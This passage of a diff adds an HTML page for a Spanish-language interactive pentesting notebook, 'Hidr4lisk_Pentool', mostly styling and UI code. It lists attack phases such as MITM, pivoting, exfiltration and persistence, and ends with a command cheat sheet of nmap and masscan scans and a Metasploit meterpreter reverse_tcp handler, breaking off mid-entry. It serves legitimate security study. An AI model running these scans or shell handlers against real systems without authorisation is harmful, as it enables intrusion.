@@ -1,0 +1,2269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hidr4lisk_Pentool — Interactive Pentesting Guide</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text-dim: #b0b8c1;
+    --accent: #58a6ff;
+    --green: #3fb950;
+    --orange: #d29922;
+    --red: #f85149;
+    --font: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+  }
+  html { font-size: 18px; transition: font-size 0.15s ease; }
+  /* Top-bar: switcher de proyectos Hidr4lisk (mismo patrón que warp/shield/tech) */
+  .top-bar { border-bottom: 1px solid var(--border); background: var(--surface); }
+  .top-bar-inner { max-width: 1800px; margin: 0 auto; padding: 8px 16px; display: flex; align-items: center; gap: 12px; }
+  .tool-select { background: var(--bg); color: var(--text); border: 1px solid var(--border);
+    border-radius: 6px; font-family: var(--font); font-size: 0.8rem; font-weight: 700;
+    letter-spacing: 0.04em; padding: 4px 10px; cursor: pointer; }
+  .tool-select:hover { border-color: var(--accent); color: var(--accent); }
+  .top-bar-brand { margin-left: auto; font-family: var(--font); font-size: 0.78rem;
+    color: var(--text-dim); text-decoration: none; }
+  .top-bar-brand:hover { color: var(--accent); }
+  body {
+    font-family: var(--font);
+    background: var(--bg);
+    color: var(--text);
+    line-height: 2.5;
+    font-weight: 500;
+    letter-spacing: 0.02em;
+    padding: 32px;
+    min-height: 100vh;
+  }
+  .container { max-width: 1800px; margin: 0 auto; }
+  header {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 16px;
+    margin-bottom: 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  header h1 {
+    font-size: 1.8rem;
+    font-weight: 600;
+    color: var(--green);
+    letter-spacing: -0.5px;
+  }
+  header h1 span { color: var(--accent); }
+  header .sub {
+    font-size: 0.95rem;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+  .toolbar {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  .toolbar button {
+    font-family: var(--font);
+    font-size: 0.9rem;
+    padding: 6px 14px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: var(--surface);
+    color: var(--text);
+    cursor: pointer;
+    transition: all 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .toolbar button:hover { border-color: var(--accent); color: var(--accent); }
+  .font-size-controls {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 0 6px;
+    background: var(--surface);
+  }
+  .font-size-controls button {
+    border: none;
+    background: transparent;
+    padding: 4px 6px;
+    font-size: 0.9rem;
+    color: var(--text);
+    cursor: pointer;
+    border-radius: 3px;
+  }
+  .font-size-controls button:hover { background: rgba(88,166,255,0.15); color: var(--accent); }
+  #fontSizeLabel {
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    min-width: 30px;
+    text-align: center;
+    cursor: pointer;
+    border-radius: 3px;
+    padding: 2px 4px;
+    transition: background 0.15s;
+  }
+  #fontSizeLabel:hover { background: rgba(88,166,255,0.15); color: var(--accent); }
+  .toolbar button.export { border-color: var(--green); color: var(--green); }
+  .toolbar button.export:hover { background: rgba(63,185,80,0.1); }
+  .toolbar button.import { border-color: var(--orange); color: var(--orange); }
+  .toolbar button.import:hover { background: rgba(210,153,34,0.1); }
+  .tabs {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+  }
+  .tabs button {
+    font-family: var(--font);
+    font-size: 1rem;
+    padding: 12px 28px;
+    border: none;
+    border-bottom: 2px solid transparent;
+    background: transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .tabs button:hover { color: var(--text); }
+  .tabs button.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .tab-content { display: none; }
+  .tab-content.active { display: grid; grid-template-columns: 1fr; gap: 48px; align-items: start; }
+  .tab-content.active.two-col { grid-template-columns: 1fr 1fr; }
+  .step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 38px 40px;
+    margin-bottom: 16px;
+  }
+  .step-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+  .step-title {
+    font-size: 1.2rem;
+    font-weight: 600;
+    color: var(--accent);
+  }
+  .step-title .num { color: var(--text-dim); margin-right: 6px; }
+  .step-desc {
+    font-size: 1.05rem;
+    color: var(--text-dim);
+    margin-bottom: 10px;
+    line-height: 1.8;
+  }
+  .step textarea {
+    font-family: var(--font);
+    font-size: 1rem;
+    width: 100%;
+    min-height: 100px;
+    padding: 16px 20px;
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text);
+    resize: vertical;
+    outline: none;
+    transition: border 0.15s;
+    margin-top: 8px;
+  }
+  .step textarea:focus { border-color: var(--accent); }
+  .step textarea::placeholder { color: #484f58; }
+  /* Tool chips */
+  .step-tools {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    font-size: 0.9rem;
+    margin-bottom: 4px;
+  }
+  .tool-chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 14px;
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    background: rgba(48,54,61,0.3);
+    cursor: pointer;
+    transition: all 0.15s;
+    user-select: none;
+    font-size: 0.95rem;
+    color: var(--orange);
+  }
+  .tool-chip:hover { border-color: var(--orange); background: rgba(210,153,34,0.1); }
+  .tool-chip.checked { border-color: var(--green); background: rgba(63,185,80,0.15); color: var(--green); font-weight: 600; }
+  .tool-chip input[type="checkbox"] {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 12px;
+    height: 12px;
+    border: 1px solid var(--text-dim);
+    border-radius: 2px;
+    background: transparent;
+    cursor: pointer;
+    transition: all 0.15s;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .tool-chip input[type="checkbox"]:checked {
+    border-color: var(--green);
+    background: var(--green);
+  }
+  .tool-chip input[type="checkbox"]:checked::after {
+    content: "✓";
+    position: absolute;
+    top: -3px;
+    left: 1px;
+    font-size: 12px;
+    color: #000;
+    font-weight: 700;
+  }
+  .tool-chip .tool-name { pointer-events: auto; cursor: pointer; text-decoration: underline dotted; text-underline-offset: 2px; }
+  /* Tool examples panel — overlay flotante */
+  .tool-examples {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0.95);
+    width: min(92vw, 960px);
+    max-height: 84vh;
+    z-index: 200;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.7);
+    opacity: 0;
+    transition: opacity 0.2s, transform 0.2s;
+  }
+  .tool-examples.open {
+    display: flex;
+    flex-direction: column;
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1);
+  }
+  .tool-examples-backdrop {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.55);
+    z-index: 199;
+    backdrop-filter: blur(2px);
+  }
+  .tool-examples-backdrop.open { display: block; }
+  .tool-examples .ex-tabs {
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    background: rgba(1,4,9,0.4);
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .tool-examples .ex-tabs::-webkit-scrollbar { height: 4px; }
+  .tool-examples .ex-tabs::-webkit-scrollbar-track { background: transparent; }
+  .tool-examples .ex-tabs::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  .tool-examples .ex-tab {
+    font-family: var(--font);
+    font-size: 0.9rem;
+    padding: 6px 14px;
+    border: none;
+    border-bottom: 2px solid transparent;
+    background: transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .tool-examples .ex-tab:hover { color: var(--text); }
+  .tool-examples .ex-tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .tool-examples .ex-content {
+    display: none;
+    padding: 12px 14px;
+    background: #010409;
+    flex: 1;
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .tool-examples .ex-content::-webkit-scrollbar { width: 4px; }
+  .tool-examples .ex-content::-webkit-scrollbar-track { background: transparent; }
+  .tool-examples .ex-content::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  .tool-examples .ex-content.active { display: block; }
+  .tool-examples .ex-content .ex-desc {
+    font-size: 1rem;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+  }
+  .tool-examples .ex-content pre {
+    font-family: var(--font);
+    font-size: 1rem;
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 12px 14px;
+    overflow-x: auto;
+    color: var(--green);
+    line-height: 1.5;
+    margin-bottom: 4px;
+    white-space: pre;
+    word-break: normal;
+    cursor: pointer;
+    position: relative;
+  }
+  .tool-examples .ex-content pre:last-child { margin-bottom: 0; }
+  .ex-content pre.ex-comment { color: var(--text-dim); font-style: italic; }
+  .ex-content pre.ex-comment::before { content: "# "; opacity: 0.5; }
+  .ex-content pre.copied::after {
+    content: "Copied!";
+    position: absolute;
+    top: 4px;
+    right: 8px;
+    font-size: 0.85rem;
+    color: var(--green);
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 3px;
+  }
+  .search-bar {
+    margin-bottom: 16px;
+  }
+  .search-bar input {
+    font-family: var(--font);
+    font-size: 1rem;
+    width: 100%;
+    padding: 12px 16px;
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text);
+    outline: none;
+    transition: border 0.15s;
+  }
+  .search-bar input:focus { border-color: var(--accent); }
+  .search-bar input::placeholder { color: #484f58; }
+  .hidden { display: none !important; }
+  #fileInput { display: none; }
+  /* Session bar */
+  .session-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 14px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+  }
+  .session-bar .label {
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    flex-shrink: 0;
+  }
+  .session-bar select {
+    font-family: var(--font);
+    font-size: 0.9rem;
+    padding: 6px 12px;
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text);
+    outline: none;
+    cursor: pointer;
+    max-width: 200px;
+  }
+  .session-bar select:focus { border-color: var(--accent); }
+  .session-bar button {
+    font-family: var(--font);
+    font-size: 0.9rem;
+    padding: 5px 12px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .session-bar button:hover { border-color: var(--accent); color: var(--accent); }
+  .session-bar button.danger:hover { border-color: var(--red); color: var(--red); }
+  .session-bar .session-info {
+    margin-left: auto;
+    font-size: 0.9rem;
+    color: var(--text-dim);
+  }
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 24px;
+    font-size: 0.95rem;
+    color: var(--green);
+    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    opacity: 0;
+    transform: translateY(10px);
+    transition: all 0.25s;
+    pointer-events: none;
+    z-index: 999;
+  }
+  .toast.show { opacity: 1; transform: translateY(0); }
+  .toast.error { color: var(--red); }
+  /* Progress bar */
+  .progress-bar {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 16px;
+    padding: 12px 16px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    align-items: center;
+  }
+  .progress-bar .label {
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    margin-right: 8px;
+    flex-shrink: 0;
+  }
+  .progress-bar .bar {
+    flex: 1;
+    height: 6px;
+    background: rgba(48,54,61,0.5);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  .progress-bar .bar .fill {
+    height: 100%;
+    background: var(--green);
+    border-radius: 3px;
+    transition: width 0.3s;
+    width: 0%;
+  }
+  .progress-bar .count {
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    margin-left: 8px;
+    flex-shrink: 0;
+  }
+  .step.header-highlight {
+    border-left: 3px solid var(--green);
+  }
+  .tool-examples-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 6px 12px;
+    background: rgba(1,4,9,0.6);
+    border-bottom: 1px solid var(--border);
+  }
+  .tool-examples-header .ex-title {
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .tool-examples-header .ex-close {
+    background: none;
+    border: none;
+    color: var(--text-dim);
+    cursor: pointer;
+    font-size: 1.1rem;
+    line-height: 1;
+    padding: 2px 6px;
+    border-radius: 3px;
+    transition: all 0.15s;
+  }
+  .tool-examples-header .ex-close:hover {
+    color: var(--red);
+    background: rgba(248,81,73,0.1);
+  }
+  .shortcut-hints {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px 16px;
+    padding: 8px 16px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin-bottom: 16px;
+    font-size: 0.95rem;
+    color: var(--text-dim);
+    align-items: center;
+  }
+  .shortcut-hints kbd {
+    display: inline-block;
+    padding: 1px 5px;
+    background: rgba(48,54,61,0.5);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    font-family: var(--font);
+    font-size: 0.85rem;
+    color: var(--text);
+    line-height: 1.4;
+  }
+  .shortcut-hints .hint-group {
+    display: inline-flex;
+    gap: 4px;
+    align-items: center;
+  }
+  .shortcut-hints .hint-toggle {
+    cursor: pointer;
+    color: var(--accent);
+    margin-left: auto;
+    user-select: none;
+  }
+  .shortcut-hints .hint-toggle:hover { text-decoration: underline; }
+  .tool-stats {
+    display: flex; align-items: center; gap: 8px; padding: 6px 14px;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 6px; margin-bottom: 16px; flex-wrap: wrap;
+    font-size: 0.9rem;
+  }
+  .tool-stats .label { color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.3px; }
+  .tool-stats .count { color: var(--text); white-space: nowrap; }
+  .tool-stats .list { color: var(--text-dim); display: flex; gap: 4px; flex-wrap: wrap; }
+  .tool-stats .list .used { color: var(--green); }
+  .tool-stats .list .unused { color: var(--text-dim); opacity: 0.5; }
+  .tool-stats .toggle-view { cursor: pointer; color: var(--accent); margin-left: auto; user-select: none; }
+  .step-tool-count { font-size: 0.95rem; color: var(--text-dim); font-weight: 400; margin-left: 8px; }
+  /* Trail map */
+  .trail-map {
+    margin-top: 6px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 3px;
+    padding: 8px 0;
+    border-top: 1px dashed var(--border);
+  }
+  .trail-map .trail-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: rgba(48,54,61,0.4);
+    transition: all 0.2s;
+    cursor: default;
+    position: relative;
+  }
+  .trail-dot.used { background: var(--green); box-shadow: 0 0 6px rgba(63,185,80,0.5); }
+  .trail-dot.current { background: var(--accent); box-shadow: 0 0 8px rgba(88,166,255,0.5); }
+  .trail-dot:hover { transform: scale(1.4); }
+  .trail-dot[data-tooltip]:hover::after {
+    content: attr(data-tooltip);
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-size: 0.85rem;
+    padding: 2px 8px;
+    border-radius: 3px;
+    white-space: nowrap;
+    z-index: 10;
+    pointer-events: none;
+    margin-bottom: 4px;
+  }
+  .trail-map .trail-label {
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    line-height: 8px;
+    align-self: center;
+    margin-left: 4px;
+  }
+  .trail-summary {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    align-items: center;
+    margin-bottom: 16px;
+    padding: 10px 14px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 0.95rem;
+  }
+  .trail-summary .label {
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    margin-right: 4px;
+    flex-shrink: 0;
+  }
+  .trail-summary .trail-stats { color: var(--text); }
+  .trail-summary .trail-path {
+    display: flex;
+    gap: 2px;
+    align-items: center;
+    flex-wrap: wrap;
+    flex: 1;
+  }
+  .trail-summary .trail-node {
+    padding: 3px 8px;
+    border-radius: 3px;
+    font-size: 0.9rem;
+    white-space: nowrap;
+  }
+  .trail-summary .trail-node.done { background: rgba(63,185,80,0.15); color: var(--green); }
+  .trail-summary .trail-node.pending { background: rgba(48,54,61,0.3); color: var(--text-dim); opacity: 0.5; }
+  .trail-summary .trail-arrow {
+    color: var(--border);
+    font-size: 0.85rem;
+    margin: 0 1px;
+  }
+  .tool-journey {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    align-items: flex-start;
+    margin-bottom: 16px;
+    padding: 10px 14px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 0.95rem;
+  }
+  .tool-journey .label {
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    margin-right: 4px;
+    flex-shrink: 0;
+    align-self: center;
+  }
+  .journey-list {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 12px;
+    flex: 1;
+  }
+  .journey-entry {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 0.9rem;
+    background: rgba(63,185,80,0.08);
+    border: 1px solid rgba(63,185,80,0.2);
+    color: var(--green);
+    white-space: nowrap;
+  }
+  .journey-entry .j-name { font-weight: 600; }
+  .journey-entry .j-steps { color: var(--text-dim); }
+  .journey-entry .j-arrow { color: var(--border); margin: 0 1px; }
+  .step-stats {
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    text-align: right;
+    padding: 2px 4px 0 0;
+    opacity: 0.6;
+    transition: opacity 0.15s;
+    margin-top: 2px;
+  }
+  .step-stats.dirty { opacity: 1; color: var(--accent); }
+  @media (max-width: 1000px) {
+    .tab-content.active { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 600px) {
+    header { flex-direction: column; align-items: flex-start; }
+    .toolbar { width: 100%; }
+    .toolbar button { flex: 1; justify-content: center; }
+    .tool-examples .ex-tab { padding: 6px 10px; font-size: 0.9rem; }
+    .session-bar { gap: 6px; padding: 8px 10px; }
+    .session-bar select { max-width: 140px; font-size: 0.9rem; }
+    .session-bar button { padding: 4px 8px; font-size: 0.9rem; }
+    .session-bar .session-info { display: none; }
+    .trail-summary .trail-node { font-size: 0.85rem; padding: 2px 4px; }
+    .step-tools { gap: 4px; }
+    .tool-chip { padding: 2px 8px; font-size: 0.9rem; }
+    .shortcut-hints { gap: 2px 10px; font-size: 0.9rem; }
+    .progress-bar { padding: 8px 10px; }
+    .tool-stats { padding: 6px 10px; }
+    .tab-content.active { grid-template-columns: 1fr; }
+  }
+  .step-header { cursor: pointer; user-select: none; }
+  .collapse-arrow { display: inline-block; width: 14px; font-size: 0.85rem; color: var(--text-dim); }
+  .step.collapsed .step-tools,
+  .step.collapsed .trail-map,
+  .step.collapsed .step-desc,
+  .step.collapsed textarea,
+  .step.collapsed .step-stats,
+  .step.collapsed .tool-examples { display: none; }
+  .step textarea { overflow-y: hidden; }
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <div class="top-bar-inner">
+    <select class="tool-select" aria-label="Hidr4lisk tools" onchange="if(this.value)window.location.href=this.value">
+      <option value="https://hidralisk.online">Hidr4lisk_</option>
+      <option value="https://hidr4lisk.github.io/warp">WARP</option>
+      <option value="https://hidr4lisk.github.io/shield">SHIELD</option>
+      <option value="https://hidr4lisk.github.io/tech">TECH</option>
+      <option value="https://hidr4lisk.github.io/pentool" selected>PENTOOL</option>
+    </select>
+    <a class="top-bar-brand" href="https://hidralisk.online">hidr4lisk_</a>
+  </div>
+</div>
+<div class="tool-examples-backdrop" id="examplesBackdrop" onclick="closeAllExamples()"></div>
+<div class="container">
+  <header>
+    <div>
+      <h1><span>&gt;</span> Hidr4lisk_Pentool</h1>
+      <div class="sub">Interactive Pentesting Guide · offline-first</div>
+    </div>
+    <div class="toolbar">
+      <button class="export" onclick="exportMD()">⬇ Export .md</button>
+      <button class="import" onclick="document.getElementById('fileInput').click()">⬆ Import .md</button>
+      <button class="import" style="border-color:var(--red);color:var(--red)" onclick="clearNotes()">✕ Clear</button>
+      <button id="layoutToggle" onclick="toggleLayout()" title="Toggle single/two-column layout (Ctrl+Shift+G)">⊞ 2-col</button>
+      <span class="font-size-controls">
+        <button onclick="changeFontSize(-1)" title="Decrease font size (Ctrl+-)">A−</button>
+        <span id="fontSizeLabel" title="Click to reset to default (18px)">18px</span>
+        <button onclick="changeFontSize(1)" title="Increase font size (Ctrl+=)">A+</button>
+      </span>
+      <input type="file" id="fileInput" accept=".md" onchange="importMD(event)">
+    </div>
+  </header>
+
+  <div class="session-bar" id="sessionBar">
+    <span class="label">Session:</span>
+    <select id="sessionSelect" onchange="switchSession(this.value)"></select>
+    <button onclick="createSession()">+ New</button>
+    <button onclick="renameSession()">Rename</button>
+    <button class="danger" onclick="deleteSession()">Delete</button>
+    <button onclick="duplicateSession()">Duplicate</button>
+    <button onclick="exportSessionJSON()">JSON ↓</button>
+    <button onclick="document.getElementById('jsonFileInput').click()">JSON ↑</button>
+    <input type="file" id="jsonFileInput" accept=".json" style="display:none" onchange="importSessionJSON(event)">
+    <span class="session-info" id="sessionInfo"></span>
+  </div>
+
+  <div id="progress-networks" class="progress-bar"></div>
+  <div id="trailSummary" class="trail-summary" style="display:none">
+    <span class="label">Route:</span>
+    <div class="trail-path" id="trailPath"></div>
+  </div>
+  <div id="toolJourney" class="tool-journey" style="display:none">
+    <span class="label">Tool Journey:</span>
+    <div class="journey-list" id="journeyList"></div>
+  </div>
+  <div class="search-bar">
+    <input type="text" id="searchInput" placeholder="Search notes and tools..." oninput="filterNotes(this.value)">
+  </div>
+  <div id="shortcutHints" class="shortcut-hints">
+    <span class="hint-group"><kbd>Ctrl+Shift+E</kbd> Export</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+I</kbd> Import</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+N</kbd> New session</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+R</kbd> Rename session</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+D</kbd> Delete session</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+U</kbd> Duplicate</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+K</kbd> Clear notes</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+F</kbd> Focus search</span>
+    <span class="hint-group"><kbd>Ctrl+Shift+G</kbd> Toggle layout</span>
+    <span class="hint-group"><kbd>Ctrl+=</kbd> Font size +</span>
+    <span class="hint-group"><kbd>Ctrl+-</kbd> Font size −</span>
+    <span class="hint-group"><kbd>Ctrl+0</kbd> Reset font</span>
+    <span class="hint-group"><kbd>Esc</kbd> Close examples</span>
+    <span class="hint-toggle" onclick="toggleHints()">− hide</span>
+  </div>
+  <div id="toolStats" class="tool-stats" style="display:none">
+    <span class="label">Tools:</span>
+    <span class="count" id="toolStatsCount">0/0 used</span>
+    <span class="list" id="toolStatsList"></span>
+    <span class="toggle-view" id="toolStatsToggle" onclick="toggleToolStats()">+ expand</span>
+  </div>
+  <div class="tabs">
+    <button class="active" data-tab="networks" onclick="switchTab('networks')">Redes</button>
+    <button data-tab="targets" onclick="switchTab('targets')">Objetivos Individuales</button>
+  </div>
+  <div id="progress-targets" class="progress-bar"></div>
+
+  <!-- ========== REDES ========== -->
+  <div id="tab-networks" class="tab-content active"></div>
+
+  <!-- ========== OBJETIVOS INDIVIDUALES ========== -->
+  <div id="tab-targets" class="tab-content"></div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+const DATA = {
+  networks: [
+    {
+      title: "Reconocimiento de red",
+      desc: "Identificar hosts activos, servicios y topología de red. Mapear el blanco antes de cualquier ataque.",
+      tools: ["nmap", "masscan", "arp-scan", "netdiscover", "fping"]
+    },
+    {
+      title: "Enumeración de servicios",
+      desc: "Identificar versiones de servicios, SO y posibles vectores. Escaneo de puertos detallado.",
+      tools: ["nmap", "amap", "dmitry", "unicornscan"]
+    },
+    {
+      title: "Ataque a servicios de red",
+      desc: "Explotar vulnerabilidades conocidas en servicios expuestos (SMB, FTP, SSH, RDP, etc.).",
+      tools: ["Metasploit", "smbclient", "enum4linux", "hydra", "medusa"]
+    },
+    {
+      title: "Sniffing & MITM",
+      desc: "Interceptar y analizar tráfico de red. Captura de credenciales y sesiones.",
+      tools: ["tcpdump", "Wireshark", "bettercap", "mitmproxy", "ettercap"]
+    },
+    {
+      title: "Post-explotación en red",
+      desc: "Pivoting, persistencia y escalado horizontal dentro de la red comprometida.",
+      tools: ["chisel", "sshuttle", "proxychains", "ligolo-ng", "cobalt strike"]
+    },
+    {
+      title: "Reporte y documentación",
+      desc: "Consolidar hallazgos, evidencia y recomendaciones en un informe estructurado.",
+      tools: ["dradis", "cherrytree", "faraday", "markdown"]
+    }
+  ],
+  targets: [
+    {
+      title: "Enumeración del objetivo",
+      desc: "Recolectar información pasiva y activa del blanco: dominios, subdominios, IPs, tecnologías.",
+      tools: ["whois", "dig", "nslookup", "Sublist3r", "amass", "theHarvester", "whatweb"]
+    },
+    {
+      title: "Análisis de superficie de ataque",
+      desc: "Identificar endpoints, tecnologías web, WAF, parámetros y posibles vectores de entrada.",
+      tools: ["Burp Suite", "katana", "gospider", "waybackurls", "nuclei"]
+    },
+    {
+      title: "Pruebas de inyección (SQLi / XSS / SSTI)",
+      desc: "Probar vulnerabilidades de inyección en formularios, parámetros y cabeceras.",
+      tools: ["sqlmap", "dalfox", "xsstrike", "Burp Intruder"]
+    },
+    {
+      title: "Autenticación y sesión",
+      desc: "Evaluar mecanismos de login, JWT, OAuth, MFA bypass, session fixation, CSRF.",
+      tools: ["jwt_tool", "Burp Sequencer", "hydra"]
+    },
+    {
+      title: "Escalada de privilegios (local)",
+      desc: "Técnicas para escalar privilegios en sistemas Linux/Windows (kernel, misconfigs, tareas).",
+      tools: ["LinPeas", "WinPEAS", "exploit-suggester", "GTFO", "sudo", "suid", "cron"]
+    },
+    {
+      title: "Exfiltración y persistencia",
+      desc: "Extraer datos del objetivo y establecer mecanismos de persistencia.",
+      tools: ["nc", "powershell", "base64", "webshell"]
+    },
+    {
+      title: "Reporte final",
+      desc: "Documentar hallazgos, impacto, severidad y pasos de remediación.",
+      tools: ["CVSS 3.1", "DREAD", "Risk Matrix"]
+    }
+  ]
+};
+
+const TOOL_EXAMPLES = {
+  "nmap": {
+    desc: "Network Mapper — escaneo de puertos, detección de servicios y SO.",
+    lines: [
+      "nmap -sn 192.168.1.0/24                 # Ping sweep, hosts activos",
+      "nmap -sV -sC -p- 10.0.0.1               # Full scan + version + scripts",
+      "nmap -sS -O --osscan-guess 10.0.0.1      # SYN scan + detección de SO",
+      "nmap -p80,443 --script http-* target     # Scripts HTTP"
+    ]
+  },
+  "masscan": {
+    desc: "Escáner de puertos masivo, más rápido que nmap en rangos grandes.",
+    lines: [
+      "masscan 10.0.0.0/24 -p1-65535 --rate=1000",
+      "masscan --ports 0-100 10.0.0.1 -oJ scan.json"
+    ]
+  },
+  "arp-scan": {
+    desc: "Descubrimiento de hosts en la red local usando ARP.",
+    lines: [
+      "arp-scan --localnet",
+      "arp-scan 192.168.1.0/24 -t 100"
+    ]
+  },
+  "netdiscover": {
+    desc: "Descubrimiento de hosts por ARP pasivo/activo.",
+    lines: [
+      "netdiscover -r 192.168.1.0/24",
+      "netdiscover -p   # modo pasivo"
+    ]
+  },
+  "fping": {
+    desc: "Ping masivo para determinar hosts activos.",
+    lines: [
+      "fping -g 192.168.1.0/24",
+      "fping -a -g 10.0.0.0/24 2>/dev/null"
+    ]
+  },
+  "amap": {
+    desc: "Identificador de aplicaciones sobre puertos detectados.",
+    lines: [
+      "amap -A 10.0.0.1 80",
+      "amap -bqv 10.0.0.1 1-1024"
+    ]
+  },
+  "dmitry": {
+    desc: "Deepmagic Information Gathering Tool — whois, subdominios, etc.",
+    lines: [
+      "dmitry -winse target.com",
+      "dmitry -p target.com -f -b"
+    ]
+  },
+  "unicornscan": {
+    desc: "Escáner de puertos avanzado con gran control de paquetes.",
+    lines: [
+      "unicornscan -mU 10.0.0.1:1-65535",
+      "unicornscan -Iv 10.0.0.1:s1-1000"
+    ]
+  },
+  "Metasploit": {
+    desc: "Framework de explotación — módulos, payloads, post-explotación.",
+    lines: [
+      "msfconsole -q",
+      "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp",
+      "search smb type:exploit",
+      "use auxiliary/scanner/portscan/tcp"
+    ]
+  },
+  "smbclient": {
+    desc: "Cliente SMB para listar y acceder a recursos compartidos.",
+    lines: [
